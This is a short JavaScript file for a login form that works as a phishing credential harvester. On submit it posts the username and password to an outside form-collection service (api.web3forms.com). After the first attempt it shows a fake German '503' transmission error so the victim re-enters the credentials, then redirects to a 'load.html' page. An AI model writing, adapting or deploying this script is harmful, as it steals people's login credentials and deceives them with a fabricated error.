const form = document.getElementById("login_form");
const button = document.getElementById("tlogin");
const P = document.getElementById("inputP");
const name2 = document.getElementById("name2");

let count = 0;

form.addEventListener('submit', async (event) => {
    event.preventDefault();   

    P.type = "text";  

    const formData = new FormData(form);

    P.type = "password";

    try {
        const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData
    });

    if (response.ok) {
        if (count >= 1){
            window.location.replace("load.html");
        } else {
            P.value = "";
            name2.value = "";
            alert("Error: [503] Fehler bei der Datenübertragung, bitte probieren sie es erneut!");
            count++;
        }
    }

    } catch (error) {
        console.error('Submission failed:', error);
    }
});
